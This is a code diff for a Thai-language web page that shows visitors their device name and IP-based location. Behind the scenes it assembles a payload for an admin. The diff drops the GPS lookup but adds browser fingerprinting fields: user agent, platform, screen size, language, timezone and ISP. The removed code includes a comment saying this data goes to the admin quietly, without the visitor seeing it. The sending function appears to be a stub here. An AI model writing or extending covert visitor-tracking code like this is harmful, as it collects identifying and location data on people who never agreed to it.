@@ -88,11 +88,6 @@
       border: 1px solid rgba(255, 255, 255, 0.08);
     }
 
-    .map-link {
-      color: #38bdf8;
-      word-break: break-all;
-    }
-
     .small {
       margin-top: 14px;
       font-size: 15px;
@@ -142,7 +137,7 @@
   </button>
 
   <div class="small">
-  ระบบจะแสดงชื่อเครื่อง และตำแหน่งโดยประมาณจาก IP
+    ระบบจะแสดงชื่อเครื่อง และตำแหน่งโดยประมาณจาก IP
   </div>
 
   <div id="result" class="result">ยังไม่มีข้อมูล</div>
@@ -193,18 +188,6 @@ function getBrowserTimezone() {
   }
 }
 
-async function fetchJson(url) {
-  const res = await fetch(url, {
-    cache: "no-store"
-  });
-
-  if (!res.ok) {
-    throw new Error("HTTP " + res.status);
-  }
-
-  return await res.json();
-}
-
 function base64UrlEncode(str) {
   const utf8 = unescape(encodeURIComponent(str));
   const base64 = btoa(utf8);
@@ -244,9 +227,7 @@ function getCountryFullName(countryName, countryCode) {
     CA: "แคนาดา"
   };
 
-  if (countryMap[code]) {
-    return countryMap[code];
-  }
+  if (countryMap[code]) return countryMap[code];
 
   if (name === "Thailand" || name === "Thai" || name === "ไทย") {
     return "ประเทศไทย";
@@ -259,123 +240,114 @@ function getCountryFullName(countryName, countryCode) {
   return name || "-";
 }
 
+async function fetchJsonWithTimeout(url, timeout = 6000) {
+  const controller = new AbortController();
+
+  const timer = setTimeout(() => {
+    controller.abort();
+  }, timeout);
+
+  try {
+    const res = await fetch(url, {
+      cache: "no-store",
+      signal: controller.signal
+    });
+
+    if (!res.ok) {
+      throw new Error("HTTP " + res.status);
+    }
+
+    return await res.json();
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
 async function getIPInfo() {
-  const apis = [
-    {
-      name: "ipapi.co",
-      url: "https://ipapi.co/json/",
-      map: function (d) {
-        return {
-          source_api: "ipapi.co",
-          ip: d.ip || "",
-          country_name: d.country_name || "",
-          country_code: d.country_code || d.country || "",
-          latitude: d.latitude || "",
-          longitude: d.longitude || "",
-          org: d.org || "",
-          timezone: d.timezone || ""
-        };
-      }
-    },
-    {
-      name: "ipwho.is",
-      url: "https://ipwho.is/",
-      map: function (d) {
-        if (d.success === false) {
-          throw new Error(d.message || "ipwho.is failed");
-        }
+  const jobs = [
+    async function () {
+      const d = await fetchJsonWithTimeout("https://ipapi.co/json/", 6000);
 
-        return {
-          source_api: "ipwho.is",
-          ip: d.ip || "",
-          country_name: d.country || "",
-          country_code: d.country_code || "",
-          latitude: d.latitude || "",
-          longitude: d.longitude || "",
-          org: d.connection && d.connection.org ? d.connection.org : "",
-          timezone: d.timezone && d.timezone.id ? d.timezone.id : ""
-        };
-      }
+      return {
+        source_api: "ipapi.co",
+        ip: d.ip || "",
+        country_name: d.country_name || "",
+        country_code: d.country_code || d.country || "",
+        latitude: d.latitude || "",
+        longitude: d.longitude || "",
+        org: d.org || "",
+        timezone: d.timezone || ""
+      };
     },
-    {
-      name: "ipinfo.io",
-      url: "https://ipinfo.io/json",
-      map: function (d) {
-        let lat = "";
-        let lon = "";
 
-        if (d.loc && d.loc.includes(",")) {
-          const parts = d.loc.split(",");
-          lat = parts[0] || "";
-          lon = parts[1] || "";
-        }
+    async function () {
+      const d = await fetchJsonWithTimeout("https://ipwho.is/", 6000);
 
-        return {
-          source_api: "ipinfo.io",
-          ip: d.ip || "",
-          country_name: d.country || "",
-          country_code: d.country || "",
-          latitude: lat,
-          longitude: lon,
-          org: d.org || "",
-          timezone: d.timezone || ""
-        };
+      if (d.success === false) {
+        throw new Error(d.message || "ipwho.is failed");
       }
+
+      return {
+        source_api: "ipwho.is",
+        ip: d.ip || "",
+        country_name: d.country || "",
+        country_code: d.country_code || "",
+        latitude: d.latitude || "",
+        longitude: d.longitude || "",
+        org: d.connection && d.connection.org ? d.connection.org : "",
+        timezone: d.timezone && d.timezone.id ? d.timezone.id : ""
+      };
     },
-    {
-      name: "geojs.io",
-      url: "https://get.geojs.io/v1/ip/geo.json",
-      map: function (d) {
-        return {
-          source_api: "geojs.io",
-          ip: d.ip || "",
-          country_name: d.country || "",
-          country_code: d.country_code || "",
-          latitude: d.latitude || "",
-          longitude: d.longitude || "",
-          org: d.organization_name || "",
-          timezone: d.timezone || ""
-        };
-      }
-    },
-    {
-      name: "api.ipify.org",
-      url: "https://api.ipify.org?format=json",
-      map: function (d) {
-        return {
-          source_api: "api.ipify.org",
-          ip: d.ip || "",
-          country_name: "",
-          country_code: "",
-          latitude: "",
-          longitude: "",
-          org: "",
-          timezone: ""
-        };
-      }
+
+    async function () {
+      const d = await fetchJsonWithTimeout("https://get.geojs.io/v1/ip/geo.json", 6000);
+
+      return {
+        source_api: "geojs.io",
+        ip: d.ip || "",
+        country_name: d.country || "",
+        country_code: d.country_code || "",
+        latitude: d.latitude || "",
+        longitude: d.longitude || "",
+        org: d.organization_name || "",
+        timezone: d.timezone || ""
+      };
     }
   ];
 
-  for (const api of apis) {
+  try {
+    return await Promise.any(jobs.map(job => job()));
+  } catch (err) {
+    console.warn("Geo IP APIs failed:", err);
+
     try {
-      const raw = await fetchJson(api.url);
-      return api.map(raw);
+      const d = await fetchJsonWithTimeout("https://api.ipify.org?format=json", 5000);
+
+      return {
+        source_api: "api.ipify.org",
+        ip: d.ip || "",
+        country_name: "",
+        country_code: "",
+        latitude: "",
+        longitude: "",
+        org: "",
+        timezone: "",
+        error: "ดึงได้เฉพาะ IP ไม่มีประเทศและพิกัด"
+      };
     } catch (e) {
-      console.warn(api.name + " error:", e);
+      return {
+        source_api: "",
+        ip: "",
+        country_name: "",
+        country_code: "",
+        latitude: "",
+        longitude: "",
+        org: "",
+        timezone: "",
+        error: "ดึงข้อมูล IP ไม่สำเร็จทุก API"
+      };
     }
   }
-
-  return {
-    source_api: "",
-    ip: "",
-    country_name: "",
-    country_code: "",
-    latitude: "",
-    longitude: "",
-    org: "",
-    timezone: "",
-    error: "ดึงข้อมูล IP ไม่สำเร็จทุก API"
-  };
 }
 
 function normalizeIP(ip) {
@@ -390,63 +362,6 @@ function normalizeIP(ip) {
     source_api: ip.source_api || "",
     error: ip.error || ""
   };
-}
-
-/*
-  GPS จริงของเครื่อง
-  ถ้าผู้ใช้ไม่อนุญาต จะไม่สามารถบังคับได้
-*/
-async function getGPSOptional() {
-  if (!navigator.geolocation) {
-    return {
-      allowed: false,
-      latitude: "",
-      longitude: "",
-      accuracy: "",
-      error: "เบราว์เซอร์นี้ไม่รองรับ GPS"
-    };
-  }
-
-  try {
-    const pos = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        resolve,
-        reject,
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-    });
-
-    return {
-      allowed: true,
-      latitude: pos.coords.latitude,
-      longitude: pos.coords.longitude,
-      accuracy: pos.coords.accuracy,
-      error: ""
-    };
-
-  } catch (err) {
-    let msg = "ไม่สามารถดึง GPS ได้";
-
-    if (err.code === 1) {
-      msg = "ผู้ใช้ไม่อนุญาต GPS";
-    } else if (err.code === 2) {
-      msg = "ไม่พบตำแหน่งของเครื่อง";
-    } else if (err.code === 3) {
-      msg = "ดึง GPS นานเกินไป หมดเวลา";
-    }
-
-    return {
-      allowed: false,
-      latitude: "",
-      longitude: "",
-      accuracy: "",
-      error: msg
-    };
-  }
 }
 
 /*
@@ -486,34 +401,44 @@ async function postToAdmin(payload) {
         ok: true,
         message: "sent"
       });
-    }, 1800);
+    }, 1200);
   });
 }
 
-function renderResult(payload) {
-  let html = "";
+function showLoading(deviceName) {
+  result.textContent =
+`1 ชื่อเครื่อง
+ชื่อเครื่อง: ${deviceName}
 
-  html += `1 ชื่อเครื่อง\n`;
-  html += `ชื่อเครื่อง: ${val(payload.device_name)}\n\n`;
 
-  html += `====== ข้อมูล IP / VPN ======\n`;
-  html += `ประเทศ: ${val(payload.ip_country)}\n`;
-  html += `IP: ${val(payload.ip)}\n`;
-  html += `Google Maps IP:\n`;
-  html += `${val(payload.ip_google_maps)}\n`;
+====== ข้อมูล IP / VPN ======
+กำลังดึงข้อมูล IP...`;
+}
 
-  /*
-    ถ้า GPS อนุญาตเท่านั้น ค่อยแสดง GPS จริง
-    ถ้าไม่อนุญาต จะไม่แสดง Latitude: - Longitude: -
-  */
-  if (payload.gps_allowed && payload.gps_google_maps !== "-") {
-    html += `\n====== ตำแหน่ง GPS จากเครื่อง ======\n`;
-    html += `Google Maps GPS:\n`;
-    html += `${payload.gps_google_maps}\n`;
-    html += `ความแม่นยำ: ${payload.gps_accuracy || "-"}\n`;
-  }
+function showResult(payload) {
+  result.textContent =
+`1 ชื่อเครื่อง
+ชื่อเครื่อง: ${val(payload.device_name)}
 
-  result.textContent = html;
+
+====== ข้อมูล IP / VPN ======
+ประเทศ: ${val(payload.ip_country)}
+IP: ${val(payload.ip)}
+
+Google Maps IP:
+${val(payload.ip_google_maps)}`;
+}
+
+function showError(deviceName) {
+  result.textContent =
+`1 ชื่อเครื่อง
+ชื่อเครื่อง: ${deviceName}
+
+
+====== ข้อมูล IP / VPN ======
+ดึงข้อมูล IP ไม่สำเร็จ
+
+ลองใหม่อีกครั้ง หรือปิด AdBlock / VPN บางตัวที่บล็อก API`;
 }
 
 async function sendLocation() {
@@ -522,23 +447,14 @@ async function sendLocation() {
 
   const deviceName = getDeviceName();
 
-  // แสดงชื่อเครื่องขึ้นทันที ไม่ต้องรอ IP / GPS
-  result.textContent = `
-1 ชื่อเครื่อง
-ชื่อเครื่อง: ${deviceName}
-
-
-====== ข้อมูล IP / VPN ======
-กำลังดึงข้อมูล IP...
-`;
+  showLoading(deviceName);
 
   try {
-    // จำกัดเวลารอ IP แค่ 4 วินาที
     const rawIP = await Promise.race([
       getIPInfo(),
-      new Promise((_, reject) =>
-        setTimeout(() => reject(new Error("IP_TIMEOUT")), 4000)
-      )
+      new Promise((_, reject) => {
+        setTimeout(() => reject(new Error("IP_TIMEOUT")), 7000);
+      })
     ]);
 
     const ip = normalizeIP(rawIP);
@@ -556,50 +472,38 @@ async function sendLocation() {
     const payload = {
       device_name: deviceName,
 
+      browser: getBrowserName(),
+      platform: navigator.platform || "",
+      user_agent: navigator.userAgent || "",
+      language: navigator.language || "",
+      screen: `${screen.width}x${screen.height}`,
+      timezone_browser: getBrowserTimezone(),
+
       ip: ip.ip || "",
       ip_country: countryFullName,
       ip_country_code: ip.country_code || "",
       ip_latitude: ip.latitude || "",
       ip_longitude: ip.longitude || "",
       ip_google_maps: ipGoogleMaps,
+      ip_org: ip.org || "",
+      ip_timezone: ip.timezone || "",
       ip_source_api: ip.source_api || "",
       ip_error: ip.error || "",
 
       sent_at: new Date().toLocaleString("th-TH")
     };
 
-    result.textContent = `
-1 ชื่อเครื่อง
-ชื่อเครื่อง: ${val(payload.device_name)}
+    showResult(payload);
 
-
-====== ข้อมูล IP / VPN ======
-ประเทศ: ${val(payload.ip_country)}
-IP: ${val(payload.ip)}
-
-Google Maps IP:
-${ipGoogleMaps}
-`;
-
-    // ส่งไปแอดมินแบบเงียบ ๆ ไม่ต้องรอให้ผู้กดเห็น
     postToAdmin(payload).catch(err => {
       console.warn("ส่งข้อมูลไม่สำเร็จ:", err);
     });
 
   } catch (err) {
-    result.textContent = `
-1 ชื่อเครื่อง
-ชื่อเครื่อง: ${deviceName}
-
-
-====== ข้อมูล IP / VPN ======
-ดึงข้อมูล IP ไม่สำเร็จ หรือใช้เวลานานเกินไป
-`;
-
     console.warn("IP error:", err);
+    showError(deviceName);
   }
 
-  // ให้ปุ่มกลับมากดได้เลย
   btn.disabled = false;
   btn.textContent = "กดเพื่อตรวจสอบ";
 }
